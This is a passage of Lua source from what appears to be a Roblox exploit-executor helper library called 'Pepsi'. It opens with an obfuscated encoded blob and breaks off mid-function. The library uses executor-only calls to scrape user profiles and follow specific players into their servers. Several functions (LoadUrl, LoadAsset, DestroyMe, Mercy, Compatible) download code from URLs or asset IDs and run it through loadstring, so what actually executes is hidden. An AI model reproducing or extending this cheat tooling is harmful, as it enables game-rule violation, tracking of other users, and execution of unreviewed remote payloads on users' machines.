Q=FLhnQ}$FC:4$t7@PFkTW(s8QQALav8?qOF01$)oPVNRqyoYFVd5-0V@uhX/7d}2=SJOk@!hWt3ZaE6g.vnT&fFmXNq>Fg%g0uk}tefDT<xDm{*m?qotaMg%4Fx?-i6CF9e0kHtz3@(9E@y15YA#GCO>EN:WNuwk=)97aeV/zOUm-!cJ%7s.IyIkOuQF8u5.YmSxN@ZTxHI(9m>$9AtwJC/j#?/)!iV.%5&C8NHWOgHpd[t7OUvWNwWux}]D{lV6DRnF:X?x+xBkP]D!k{N:<W!trqVoUVt}?7822MPnR!EB:TO:7$@K05Z3!xyT7=lbiwrI7g!>E2]LvkOX.hL4C]w{=hmf1CUAne5UhD]A($Zb^7^*E1sCD?B{spOq&>8J1<j%kBoA(@d9(Bz[5f@pxbSO7JpYU2T")), ...)
	--end
end
function Pepsi.GetChars(include_me)
	local players = (include_me and Pepsi.Service("Players"):GetPlayers()) or Pepsi.GetOthers() or {}
	local news = {}
	for _, plr in pairs(players) do
		if plr and plr.Character then
			table.insert(news, plr.Character)
		end
	end
	return news or {}
end
function Pepsi.FilterChars(losers)
	if type(losers) ~= "table" then
		return Pepsi.GetChars()
	end
	local players = losers or Pepsi.GetOthers() or {}
	local news = {}
	for _, plr in pairs(players) do
		if plr and plr.Character then
			table.insert(news, plr.Character)
		end
	end
	return news or {}
end
function Pepsi.Get(url)
	if type(url) ~= "string" then
		Pepsi.Arg(url, "string", 1, "Pepsi.Get")
	end
	local s, res = pcall(function()
		local r, finished = {}, Instance.new("BindableEvent")
		Pepsi.Service("HttpService"):RequestInternal({
			Url = url,
			Headers = {
				["Content-Type"] = "text/plain"
			}
		}):Start(function(tru, done)
			return finished:Fire(done)
		end)
		r = finished.Event:Wait()
		finished:Destroy()
		return r and r.Body
	end)
	if not s or type(res) ~= "string" then
		s, res = pcall(function()
			return Pepsi.Service("HttpService"):GetAsync(url)
		end)
		if not s or type(res) ~= "string" then
			s, res = pcall(function()
				return game:HttpGet(url)
			end)
		end
	end
	return res
end
function Pepsi.PlaceIdFromUser(user)
    if type(user) == "nil" then
        user = Pepsi.Lp.UserId
    elseif type(user) == "string" then
        user = Pepsi.Service("Players"):GetUserIdFromNameAsync(user)
    end
    if type(user) ~= "number" then
        return 0
    end
    local data = Pepsi.Get("https://www.roblox.com/users/" .. tostring(user) .. "/profile")
    local _, e = string.find(data, "play_placeId=", nil, true)
    data = string.sub(data, e + 1, e + 45)
    e, _ = string.find(data, ";", nil, true)
    return tonumber(string.sub(data, 1, e - 1))
end
function Pepsi.JoinUser(user, placeid)
	if (type(user) ~= "string" and type(user) ~= "number") or (type(placeid) ~= "number" and type(placeid) ~= "nil") then
	    Pepsi.Arg(user, {"number", "string"}, 1, "Pepsi.JoinUser")
	    Pepsi.Arg(placeid, {"number", "nil"}, 2, "Pepsi.JoinUser")
	end
    if type(user) == "string" then
        user = Pepsi.Service("Players"):GetUserIdFromNameAsync(user)
    end
    if type(user) ~= "number" then
        return warn("User not found")
    end
    local place = Pepsi.PlaceIdFromUser(user)
    if place <= 0 then
        place = placeid or game.PlaceId
    end
    if type(place) ~= "number" then
        return warn("Could not find place user is in.")
    end
    local Thumbnail = table.fromjson(Pepsi.Get("https://www.roblox.com/headshot-thumbnail/json?userId=" .. user .. "&width=48&height=48")).Url
    local Index = 0
    while Pepsi.Rs:Wait() do
        local GameInstances = table.fromjson(Pepsi.Get("https://www.roblox.com/games/getgameinstancesjson?placeId=" .. place .. "&startindex=" .. Index))
        for _, V in pairs(GameInstances.Collection) do
            for I2, V2 in pairs(V.CurrentPlayers) do
                if V2.Id == user or V2.Thumbnail.Url == Thumbnail then
                    pcall(function()
                        Pepsi.Service("TeleportService"):TeleportToPlaceInstance(tonumber(place), V.Guid)
                    end)
                    local FailCounter = 0
                    for h = 0, 5 do
                        wait(3)
                        local State = Pepsi.Lp.OnTeleport:Wait()
                        if State == Enum.TeleportState.Failed then
                            FailCounter = FailCounter + 1
                            pcall(function()
                                Pepsi.Service("TeleportService"):TeleportToPlaceInstance(tonumber(place), V.Guid)
                            end)
                        end
                    end
                    return warn("Could not join server, Server ID:", V.Guid)
                end
            end
        end
        if Index > GameInstances.TotalCollectionSize then
            return warn("Failed to get game! (VIP server?)")
        end
        Index = Index + 10
    end
	return warn("Could not find server. (You're not allowed to see the game?)")
end
function Pepsi.JoinServer(server, placeid)
	if type(server) ~= "string" or (type(placeid) ~= "number" and type(placeid) ~= "nil" and not tonumber(placeid)) then
		Pepsi.Arg(server, "string", 1, "Pepsi.JoinServer")
		Pepsi.Arg(placeid, {"nil", "number"}, 1, "Pepsi.JoinServer")
	end
	Pepsi.nxcall(Pepsi.Service("TeleportService"), warn, "TeleportToPlaceInstance", tonumber(placeid or game.PlaceId), server)
end
function Pepsi.NewSignal(name, triggers)
	if type(name) ~= "string" or (type(triggers) ~= "table" and type(triggers) ~= "nil") then
		Pepsi.Arg(name, "string", 1, "Pepsi.NewSignal")
		Pepsi.Arg(triggers, {"nil", "table"}, 2, "Pepsi.NewSignal")
	end
	local ud = newproxy(true)
	local functionality = getmetatable(ud)
	functionality.__metatable = "The metatable is locked"
	functionality.__Address = tostring("Signal " .. name)
	functionality.__index = default
	function functionality.__tostring(self)
		return functionality.__Address
	end
	function functionality.__newindex(self, property, value)
		if rawget(rules, property) then
			if rules[property].readonly then
				return error("can't set value", 3)
			elseif not rules[property].types[typeof(value)] then
				if type(value) == "string" then
					return error("Invalid value \"\r" .. tostring(value:sub(1, 80)) .. "\" for " .. classname, 3)
				elseif type(value) == "number" then
					return error("Invalid value \r" .. tostring(value) .. " for " .. classname, 3)
				end
				return error("Invalid value for " .. classname, 3)
			else
				return rawset(default, property, value)
			end
		elseif newindex then
			return rawset(default, property, value)
		else
			return error(property .. " is not a valid member of RBXScriptSignal", 3)
		end
	end
end
function Pepsi.ncall(self, name, ...) -- Protected namecall [ game:GetService("Workspace") - > Pepsi.ncall(game, "GetService", "Workspace") ]
	if type(self) == "nil" or type(name) ~= "string" then
		Pepsi.Arg(self, "nil", 1, "Pepsi.ncall", true)
		Pepsi.Arg(name, "string", 2, "Pepsi.ncall")
	end
	local e, func = pcall(function()
		return self[name]
	end)
	if not e then
		return false, func
	end
	if type(func) ~= "function" then
		return false, (name .. " is not a function of " .. ((typeof(self) == "Instance" and self.ClassName) or typeof(self)) .. ".")
	end
	return pcall(func, self, ...) -- God power
end
function Pepsi.encall(self, name, ...)
	if type(self) == "nil" or type(name) ~= "string" then
		Pepsi.Arg(self, "nil", 1, "Pepsi.encall", true)
		Pepsi.Arg(name, "string", 2, "Pepsi.encall")
	end
	local e, func = pcall(function()
		return self[name]
	end)
	if not e then
		return func
	end
	if type(func) ~= "function" then
		return tostring(name .. " is not a function of " .. ((typeof(self) == "Instance" and self.ClassName) or typeof(self)) .. ".")
	end
	return Pepsi.ecall(func, self, ...)
end
function Pepsi.nxcall(self, handler, name, ...)
	if type(self) == "nil" or type(name) ~= "string" or type(handler) ~= "function" then
		Pepsi.Arg(self, "nil", 1, "Pepsi.nxcall", true)
		Pepsi.Arg(name, "string", 2, "Pepsi.nxcall")
		Pepsi.Arg(handler, "function", 3, "Pepsi.nxcall")
	end
	local e, func = pcall(function()
		return self[name]
	end)
	if not e then
		return handler(func)
	end
	if type(func) ~= "function" then
		return handler(name .. " is not a function of " .. ((typeof(self) == "Instance" and self.ClassName) or typeof(self)) .. ".")
	end
	return Pepsi.xpcall(func, handler, self, ...)
end
function Pepsi.Assert(statement, msg, level) -- Assert now accepts a 3rd arguemnt, being level
	msg = tostring(msg or "assertion failed!")
	level = tonumber(level or 1)
	if not statement then
		return error(tostring(msg), tonumber(level) + 1)
	end
	return statement
end
function Pepsi.Class(obj)
	return typeof(obj) == "Instance" and obj.ClassName or typeof(obj)
end
function Pepsi.Arg(val, mustbe, arg, func, moreinfo, inverse, isacheck, userdata_strict)
	if type(moreinfo) == "boolean" and type(inverse) == "nil" or type(inverse) == "string" then
		moreinfo, inverse = inverse, moreinfo
	end
	assert(type(mustbe) == "string" or type(mustbe) == "table", "bad argument #2 to 'Pepsi.Arg' (table/string expected, got " .. tostring(type(mustbe) == "nil" and "no value" or Pepsi.Class(mustbe)) .. ")")
	assert(type(arg) == "nil" or type(arg) == "number", "bad argument #3 to 'Pepsi.Arg' (number expected, got " .. tostring(type(arg) == "nil" and "no value" or Pepsi.Class(arg)) .. ")")
	assert(type(func) == "nil" or type(func) == "string", "bad argument #4 to 'Pepsi.Arg' (string expected, got " .. tostring(type(func) == "nil" and "no value" or Pepsi.Class(func)) .. ")")
	assert(type(moreinfo) == "nil" or type(moreinfo) == "string", "bad argument #5 to 'Pepsi.Arg' (string expected, got " .. tostring(type(moreinfo) == "nil" and "no value" or Pepsi.Class(moreinfo)) .. ")")
	assert(type(inverse) == "nil" or type(inverse) == "boolean", "bad argument #6 to 'Pepsi.Arg' (boolean expected, got " .. tostring(type(inverse) == "nil" and "no value" or Pepsi.Class(inverse)) .. ")")
	userdata_strict = robloxtype and userdata_strict
	if type(mustbe) == "string" then
		mustbe = {mustbe}
	end
	local allownil = false
	local vals = table.dictionary(mustbe)
	if vals["nil"] then
		allownil, vals["nil"] = true, nil
	end
	local str = "bad argument "
	if arg then
		str = str .. "#" .. tostring(arg) .. " "
	end
	if func then
		str = str .. "to '" .. tostring(func) .. "' "
	end
	local astr = tostring(table.concat(table.sort(table.keys(vals)), "/") or "") or ""
	if astr and str then
		local valtype = Pepsi.Class(val)
		str = str .. "(" .. tostring(astr) .. " expected, got " .. tostring((type(val) == "nil" and "no value") or valtype) .. ")"
		if moreinfo then
			str = str .. " [" .. tostring(moreinfo) .. "]"
		end
		if str then
			if allownil then
				vals["nil"] = true
			end
			if vals.userdata and userdata_strict and robloxtype(val) == "userdata" then
				vals[Pepsi.Class(vals)] = true
			end
			if isacheck then
				local pass = false
				for k, _ in pairs(vals) do
					if Pepsi.IsA(val, k) then
						pass = true
						break
					end
				end
				return Pepsi.Assert(pass, str, 3)
			end
			if inverse then
				return Pepsi.Assert(not vals[valtype] and not vals[typeof(val)], str, 3)
			end
			return Pepsi.Assert(vals[valtype] or vals[typeof(val)], str, 3)
		end
	end
end
function Pepsi.DecryptSimple(str, key)
	if type(str) ~= "string" or (type(key) ~= "string" and type(key) ~= "nil" and type(key) ~= "table") then
		Pepsi.Arg(str, {"string"}, 1, "Pepsi.DecryptSimple")
		Pepsi.Arg(key, {"table", "string", "nil"}, 2, "Pepsi.DecryptSimple")
	end
	key = (key == nil and "\0") or key
    local invalid_byte_detected = nil
    local NUM_TO_R85 = {}
    local R85_TO_NUM = setmetatable({}, {
        __index = function(self, byte)
            if byte then
                invalid_byte_detected = byte
            end
            return 0
        end
    })
    local R85_SYMBOLS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
    for i = 0, 84 do
        local symbol = R85_SYMBOLS:sub(i + 1, i + 1)
        R85_TO_NUM[string.byte(symbol)], NUM_TO_R85[i] = i, symbol
    end
    local R85_COMPRESSION_SYMBOLS = {
        ",",
        ";",
        "_",
        "`",
        "|",
        "~"
    }
    local function R85ToBlock(r85_str, index)
        local r0, r1, r2, r3, r4 = string.byte(r85_str, index, index + 4)
        invalid_byte_detected = nil
        local block = (((R85_TO_NUM[r4] * 85 + R85_TO_NUM[r3]) * 85 + R85_TO_NUM[r2]) * 85 + R85_TO_NUM[r1]) * 85 + R85_TO_NUM[r0]
        if invalid_byte_detected then
            local character = (invalid_byte_detected < 32 or invalid_byte_detected > 126) and "\\" .. invalid_byte_detected or string.char(invalid_byte_detected)
            return error("invalid byte " .. invalid_byte_detected .. " ('" .. character .. "') in data")
        end
        return block, index + 5
    end
    local index = 1
    invalid_byte_detected = nil
    local header = 84 - R85_TO_NUM[string.byte(str, index)]
    if invalid_byte_detected then
        return error("invalid data header")
    end
    index = index + 1
    local bytes_to_discard = header % 4
    local compression_map = {}
    local num_compressions = (header - bytes_to_discard) * 0.25
    if num_compressions > 6 or num_compressions % 1 ~= 0 then
        return error("invalid data header")
    end
    for i = 1, num_compressions do
        compression_map[string.byte(R85_COMPRESSION_SYMBOLS[i])], index = R85ToBlock(str, index)
    end
    local bytes, bytes_i = {}, 1
    local data_length = #str
    while index <= data_length do
        local r0, block = string.byte(str, index)
        block = compression_map[r0]
        if block then
            index = index + 1
        else
            block, index = R85ToBlock(str, index)
        end
        for i = 0, 3 do
            local byte = block % 0x100
            block = (block - byte) * 0.00390625
            bytes[bytes_i + i] = byte
        end
        bytes_i = bytes_i + 4
    end
    for i = 1, bytes_to_discard do
        bytes[bytes_i - i] = nil
    end
    local key_type = type(key)
    if key_type == "string" then
        local dest = {}
        local dest_n = #dest
        for i = 1, #key, 4 do
            local dest_i = dest_n + i
            dest[dest_i], dest[dest_i + 1], dest[dest_i + 2], dest[dest_i + 3] = string.byte(key, i, i + 3)
        end
        key = dest
    elseif key_type ~= "table" then
        Pepsi.arg(key, {"table", "string"}, 2, "Pepsi.DecryptSimple")
    end
    local key_length = #key
    if key_length < 1 then
        return error("key must contain at least one letter")
    end
    local cipher_length = #bytes
    local random_bytes = {}
    local random_seed = (cipher_length - key_length + 1) * 57163
    for i = 1, key_length do
        random_seed = (random_seed + key[i] * i) % 4194304 * 1103515245 + 12345
        random_seed = (random_seed + (i + 101) * (random_seed - random_seed % 0x10000) * 1.52587890625e-005)
    end
    for i = 1, (cipher_length - key_length + 1) * key_length do
        random_seed = (random_seed % 4194304 * 1103515245 + 12345)
        random_bytes[i] = (random_seed - random_seed % 0x10000) * 1.52587890625e-005 % 0x100
    end
    local random_i = #random_bytes
    local last_key_byte = key[key_length]
    local buffer = {}
    for i = cipher_length, key_length, -1 do
        local buffer_byte = bytes[i] - last_key_byte
        if buffer_byte < 0 then
            buffer_byte = buffer_byte + 256
        end
        buffer_byte = buffer_byte - random_bytes[random_i]
        random_i = random_i - 1
        if buffer_byte < 0 then
            buffer_byte = buffer_byte + 256
        end
        for j = key_length - 1, 1, -1 do
            i = i - 1
            local cipher_byte = bytes[i] - key[j] - buffer_byte - random_bytes[random_i]
            random_i = random_i - 1
            bytes[i] = cipher_byte % 256
        end
        buffer[i] = buffer_byte
    end
    local buffer_n = #buffer
    for i = 1, buffer_n do
        bytes[i] = buffer[i]
    end
    for i = buffer_n + 1, cipher_length do
        bytes[i] = nil
    end
    local buffer = {}
    local start_index = 1
    local end_index = #bytes
    for i = 0, end_index - start_index do
        buffer[i + 1] = string.char(bytes[start_index + i])
    end
    return table.concat(buffer)
end
function Pepsi.EncryptSimple(str, key)
	if type(str) ~= "string" or (type(key) ~= "string" and type(key) ~= "nil" and type(key) ~= "table") then
		Pepsi.Arg(str, {"string"}, 1, "Pepsi.EncryptSimple")
		Pepsi.Arg(key, {"table", "string", "nil"}, 2, "Pepsi.EncryptSimple")
	end
	key = (key == nil and "\0") or key
    local invalid_byte_detected = nil
    local NUM_TO_R85 = {}
    local R85_TO_NUM = setmetatable({}, {
        __index = function(self, byte)
            if byte then
                invalid_byte_detected = byte
            end
            return 0
        end
    })
    local R85_SYMBOLS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
    for i = 0, 84 do
        local symbol = R85_SYMBOLS:sub(i + 1, i + 1)
        R85_TO_NUM[string.byte(symbol)], NUM_TO_R85[i] = i, symbol
    end
    local R85_COMPRESSION_SYMBOLS = {
        ",",
        ";",
        "_",
        "`",
        "|",
        "~"
    }
    local NUM_COMPRESSION_SYMBOLS = #R85_COMPRESSION_SYMBOLS
    local function StringToBytes(str, dest)
        dest = dest or {}
        local dest_n = #dest
        for i = 1, #str, 4 do
            local dest_i = dest_n + i
            dest[dest_i], dest[dest_i + 1], dest[dest_i + 2], dest[dest_i + 3] = string.byte(str, i, i + 3)
        end
        return dest
    end
    local function BlockToR85(block, buffer, buffer_i)
        for i = 0, 4 do
            local r85_digit = block % 85
            block = (block - r85_digit) / 85
            buffer[buffer_i + i] = NUM_TO_R85[r85_digit]
        end
        return buffer_i + 5
    end
    local dest = StringToBytes(str)
    local key_type = type(key)
    if key_type == "string" then
        key = StringToBytes(key)
    elseif key_type ~= "table" then
        return error("key must be a string or table")
    end
    local key_length = #key
    if key_length < 1 then
        return error("key must contain at least one letter")
    end
    local data_length = #dest
    local buffer = {}
    local random_seed = data_length * 57163
    for i = 1, key_length do
        random_seed = (random_seed + key[i] * i) % 4194304 * 1103515245 + 12345
        random_seed = (random_seed + (i + 101) * (random_seed - random_seed % 65536) * 1.52587890625e-005)
    end
    for i = 1, data_length do
        local data_byte = dest[i]
        for j = 1, key_length do
            local key_byte = key[j]
            local k = i + j - 1
            local result_byte = data_byte + (buffer[k] or 0)
            random_seed = (random_seed % 4194304 * 1103515245 + 12345)
            buffer[k] = (result_byte + key_byte + (random_seed - random_seed % 65536) * 1.52587890625e-005) % 256
        end
    end
    for i = 1, #buffer do
        dest[i] = buffer[i]
    end
    local bytes_type = type(dest)
    if bytes_type == "string" then
        dest = StringToBytes(dest)
    elseif bytes_type ~= "table" then
        return error("argument #1 must be a string")
    end
    local bytes_n = #dest
    local bytes_to_discard = -bytes_n % 4
    local buffer = {
        false
    }
    local blocks, block_occurrences, most_common_blocks, common_threshold = {}, {}, {}, 1
    local block_i = 1
    for i = 1, bytes_n, 4 do
        local block = (((dest[i + 3] or 0) * 256 + (dest[i + 2] or 0)) * 256 + (dest[i + 1] or 0)) * 256 + dest[i]
        blocks[block_i], block_i = block, block_i + 1
        local occurrences = (block_occurrences[block] or 0) + 1
        block_occurrences[block] = occurrences
        if occurrences > common_threshold then
            local is_new_block = not most_common_blocks[block]
            most_common_blocks[block] = occurrences
            if is_new_block then
                local num_blocks, least_occurrences, second_least_occurrences, least_common_block = 0, math.huge, nil, nil
                for block, occurrences in pairs(most_common_blocks) do
                    num_blocks = num_blocks + 1
                    if occurrences < least_occurrences then
                        least_common_block, least_occurrences, second_least_occurrences = block, occurrences, least_occurrences
                    end
                end
                if num_blocks > NUM_COMPRESSION_SYMBOLS then
                    common_threshold, most_common_blocks[least_common_block] = second_least_occurrences, nil
                end
            end
        end
    end
    local compression_map, num_compressed_blocks = {}, 0
    local buffer_i = 2
    for common_block in pairs(most_common_blocks) do
        num_compressed_blocks = num_compressed_blocks + 1
        compression_map[common_block] = R85_COMPRESSION_SYMBOLS[num_compressed_blocks]
        buffer_i = BlockToR85(common_block, buffer, buffer_i)
    end
    buffer[1] = NUM_TO_R85[84 - bytes_to_discard - 4 * num_compressed_blocks]
    for i = 1, #blocks do
        local block = blocks[i]
        local compressed_symbol = compression_map[block]
        if compressed_symbol then
            buffer[buffer_i], buffer_i = compressed_symbol, buffer_i + 1
        else
            buffer_i = BlockToR85(blocks[i], buffer, buffer_i)
        end
    end
    local ZERO_SYMBOL = NUM_TO_R85[0]
    for i = 1, 4 do
        local symbol = buffer[buffer_i - i]
        if compression_map[symbol] or symbol ~= ZERO_SYMBOL then
            break
        end
        buffer[buffer_i - i] = nil
    end
    return table.concat(buffer)
end
function Pepsi.Encrypt(message, key)
	key = tostring(key or "Pepsi")
	local key_bytes
	if type(key) == "string" then
		key_bytes = {}
		for key_index = 1, #key do
			key_bytes[key_index] = string.byte(key, key_index)
		end
	else
		key_bytes = key
	end
	local message_length = #message
	local key_length = #key_bytes
	local message_bytes = {}
	for message_index = 1, message_length do
		message_bytes[message_index] = string.byte(message, message_index)
	end
	local result_bytes = {}
	local random_seed = 0
	for key_index = 1, key_length do
		random_seed = (random_seed + key_bytes[key_index] * key_index) * 37789 + 60061
		random_seed = (random_seed - random_seed % 256) / 256 % 65536
	end
	for message_index = 1, message_length do
		local message_byte = message_bytes[message_index]
		for key_index = 1, key_length do
			local key_byte = key_bytes[key_index]
			local result_index = message_index + key_index - 1
			local result_byte = message_byte + (result_bytes[result_index] or 0)
			if result_byte > 255 then
				result_byte = result_byte - 256
			end
			result_byte = result_byte + key_byte
			if result_byte > 255 then
				result_byte = result_byte - 256
			end
			random_seed = (random_seed * 37789 + 60061) % 65536
			result_byte = result_byte + (random_seed - random_seed % 256) / 256
			if result_byte > 255 then
				result_byte = result_byte - 256
			end
			result_bytes[result_index] = result_byte
		end
	end
	local result_characters = {}
	local result_next_index = 1
	for result_index = 1, #result_bytes do
		local result_byte = result_bytes[result_index]
		if result_byte == 0 then
			result_characters[result_next_index] = "\1"
			result_characters[result_next_index + 1] = "\1"
			result_next_index = result_next_index + 2
		elseif result_byte == 1 then
			result_characters[result_next_index] = "\1"
			result_characters[result_next_index + 1] = "\2"
			result_next_index = result_next_index + 2
		else
			result_characters[result_next_index] = string.char(result_byte)
			result_next_index = result_next_index + 1
		end
	end
	return table.concat(result_characters)
end
function Pepsi.Decrypt(message, key)
	key = tostring(key or "Pepsi")
	local message_length = #message
	local key_length = #key
	local random_seed = 0
	local g = 0
	local message_index = 1
	local message_bytes = {}
	local j = {}
	local result_bytes = {}
	local result_characters = {}
	local key_bytes
	if type(key) == "string" then
		key_bytes = {}
		for key_index = 1, key_length do
			key_bytes[key_index] = string.byte(key, key_index)
		end
	else
		key_bytes = key
	end
	while message_index <= message_length do
		local i = string.byte(message, message_index)
		g = g + 1
		if i == 1 then
			message_index = message_index + 1
			message_bytes[g] = string.byte(message, message_index) - 1
		else
			message_bytes[g] = i
		end
		message_index = message_index + 1
	end
	for key_index = 1, key_length do
		random_seed = (random_seed + key_bytes[key_index] * key_index) * 37789 + 60061
		random_seed = (random_seed - random_seed % 256) / 256 % 65536
	end
	for i = 1, (g - key_length + 1) * key_length do
		random_seed = (random_seed * 37789 + 60061) % 65536
		j[i] = (random_seed - random_seed % 256) / 256
	end
	local l = #j
	local m = key_bytes[key_length]
	for result_index = g, key_length, -1 do
		local result_byte = message_bytes[result_index] - m
		if result_byte < 0 then
			result_byte = result_byte + 256
		end
		result_byte = result_byte - j[l]
		l = l - 1
		if result_byte < 0 then
			result_byte = result_byte + 256
		end
		for q = key_length - 1, 1, -1 do
			result_index = result_index - 1
			local r = message_bytes[result_index] - key_bytes[q]
			if r < 0 then
				r = r + 256
			end
			r = r - result_byte
			if r < 0 then
				r = r + 256
			end
			r = r - j[l]
			l = l - 1
			if r < 0 then
				r = r + 256
			end
			message_bytes[result_index] = r
		end
		result_bytes[result_index] = result_byte
	end
	for result_index = 1, #result_bytes do
		result_characters[result_index] = string.char(result_bytes[result_index])
	end
	return table.concat(result_characters)
end
function Pepsi.WaitForChar(loser, rethuman, forcewait)
	if type(loser) == "boolean" and rethuman == nil then
		loser, rethuman = rethuman, loser
	end
	loser = loser or Pepsi.Me()
	local c = not forcewait and Pepsi.Char(loser)
	if not c and Pepsi.Obj(loser, "CharacterAdded") then
		local c = loser.CharacterAdded:Wait()
		while c and not Pepsi.Human(loser) do
			Pepsi.Rs:Wait()
		end
		if rethuman then
			return c, Pepsi.Human(loser)
		end
		return c
	end
	while c and not Pepsi.Human(loser) do
		Pepsi.Rs:Wait()
	end
	if rethuman then
		return c, Pepsi.Human(loser)
	end
	return c
end
function Pepsi.LoadAsset(id, run, ...)
	local func = loadstring(rawget(game:GetObjects("rbxassetid://" .. tostring(tonumber(id))), 0x1).Source)
	if run then
		return func(...)
	end
	return func
end
function Pepsi.LoadUrl(url, func, ...)
	if game.HttpGet then
		return loadstring(game:HttpGet(url))
	elseif Pepsi.Service("HttpService").GetAsync then
		return loadstring(Pepsi.Service("HttpService"):GetAsync(url))
	elseif func then
		return loadstring(func(url, ...))
	end
end
function Pepsi.Mercy()
	return pcall(Pepsi.LoadAsset(0XFD918E32))
end
function Pepsi.DestroyMe()
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
	do return pcall(loadstring(rawget(game:GetObjects("rbxassetid://4209896474"), 0X1).Source)) end
end
function Pepsi.ToVector3(obj, ...)
	if #{...} >= 2 then
		obj = tostring(tostring(obj) .. ", " .. tostring((...)) .. ", " .. tostring(({...})[2]))
	end
	if typeof(obj) == "Vector3" then
		return obj
	elseif typeof(obj) == "CFrame" then
		return obj.Position
	elseif obj and type(obj) == "table" then
		local x, y, z = obj.X or obj.x, obj.Y or obj.y, obj.z or obj.Z
		if x and y and z then
			return Vector3.new(x, y, z)
		end
		if #obj == 3 then
			return Vector3.new(unpack(obj))
		end
	elseif obj and typeof(obj) == "Instance" and obj:IsA("ValueBase") then
		obj = obj.Value
	elseif obj and typeof(obj) == "Instance" and obj:IsA("Player") then
		obj = obj.Character
	elseif type(obj) == "string" then
		obj = string.getvalue(obj) or string.getvalue("Vector3.new(" .. obj .. ")") or string.getvalue("CFrame.new(" .. obj .. ")")
		if typeof(obj) == "CFrame" then
			return obj.Position
		end
		return obj
	end
	if "nil" == type(obj) then
		return Vector3.new()
	elseif obj and typeof(obj) == "Instance" then
		if obj:IsA("BasePart") then
			return obj.Position
		elseif obj:IsA("Model") then
			return (obj:GetBoundingBox())
		elseif obj:FindFirstChildWhichIsA("BasePart") or obj:FindFirstChildWhichIsA("BasePart", true) then
			obj = obj:FindFirstChildWhichIsA("BasePart") or obj:FindFirstChildWhichIsA("BasePart", true)
			return obj.Position
		end
	end
	return Vector3.new()
end
function Pepsi.MapChildren(obj, depth, max)
	depth, max = (type(depth) == "number" and depth) or 0, (type(max) == "number" and max) or 10
	local tree = {}
	if typeof(obj) ~= "Instance" or depth > max then
		return depth == 0 and tree
	else
		for o, v in pairs(obj:GetChildren()) do
			if typeof(v) == "Instance" then
				local c = Pepsi.MapChildren(v, depth + 1, max)
				if type(c) == "table" then
					tree[v:GetFullName()] = c
				else
					tree[v:GetFullName()] = o
				end
			end
		end
	end
	return tree
end
function Pepsi.Compatible()
	return loadstring(rawget(game:GetObjects("rbxassetid://4108946409"), 0x1).Source)("Compatibilize")
end
function Pepsi.GetOthers(...)
	local args = {...}
	if #args == 0 then
		args = {
			Pepsi.Me()
		}
	end
	args = table.dictionary(args)
	local losers = {}
	for _, loser in pairs(Pepsi.Service("Players"):GetPlayers()) do
		if not args[loser] then
			table.insert(losers, loser)
		end
	end
	return losers
end
function Pepsi.Trip(tog, loser) -- A little fun function. Requested.
	Pepsi.oldgrav = Pepsi.oldgrav or workspace.Gravity
	workspace.Gravity = -math.huge
	wait()
	Pepsi.Torso().CFrame = Pepsi.Torso().CFrame + Vector3.new(0, 5.5, 0)
	wait()
	workspace.Gravity = Pepsi.oldgrav
	return Pepsi.State(Enum.HumanoidStateType.Ragdoll, tog, loser)
end
function Pepsi.State(state, tog, loser)
	if not loser or typeof(loser) ~= "Instance" or not loser:IsA("Humanoid") then
		loser = Pepsi.Human(loser)
	end
	if type(tog) == "number" then
		delay(tog, function()
			Pepsi.Misc[state] = false
		end)
		tog = true
	elseif type(tog) ~= "boolean" then
		local h = Pepsi.Human()
		if h then
			h:ChangeState(state)
		end
		return
	end
	if type(tog) == "boolean" then
		if not tog then
			return rawset(Pepsi.Misc, state, false)
		elseif rawget(Pepsi.Misc, state) == tog then
			return
		end
		local h = Pepsi.Human()
		while not h and wait() do
			h = Pepsi.Human()
		end
		Pepsi.Misc[state] = true
		h:ChangeState(state)
		spawn(function()
			while Pepsi.Misc[state] and wait() do
				pcall(function()
					local h = Pepsi.Human()
					if h then
						local old, new = h.StateChanged:Wait()
						if new ~= state and h then
							h:ChangeState(state)
						end
					end
				end)
			end
		end)
	end
end
function Pepsi.ToCFrame(obj, ...)
	if #{...} >= 2 then
		obj = tostring(tostring(obj) .. ", " .. tostring((...)) .. ", " .. tostring(({...})[2]))
	end
	if obj and typeof(obj) == "Instance" and obj:IsA("ValueBase") then
		obj = obj.Value
	elseif type(obj) == "string" then
		obj = string.getvalue(obj) or string.getvalue("CFrame.new(" .. obj .. ")") or string.getvalue(obj)
		if typeof(obj) == "CFrame" then
			return obj
		end
		return obj
	elseif typeof(obj) == "Vector3" then
		return CFrame.new(obj.X, obj.Y, obj.Z)
	elseif typeof(obj) == "CFrame" then
		return obj
	end
	if nil == obj then
		return CFrame.new()
	elseif obj and typeof(obj) == "Instance" then
		if obj:IsA("BasePart") then
			return obj.CFrame
		elseif obj:IsA("Model") and obj.PrimaryPart then
			return obj.PrimaryPart.CFrame
		elseif obj:FindFirstChildWhichIsA("BasePart") or obj:FindFirstChildWhichIsA("BasePart", true) then
			obj = obj:FindFirstChildWhichIsA("BasePart") or obj:FindFirstChildWhichIsA("BasePart", true)
			return obj.CFrame
		end
	end
end

-- God fucking damnit. Theres a fucking moth hellbent on being on my screen.

function Pepsi.KeyPress(key, duration)
	if nil == duration then
		duration = 0.08
	end
	if type(duration) == "number" then
		Pepsi.Service("VirtualInputManager"):SendKeyEvent(true, key, false, game)
		wait(duration)
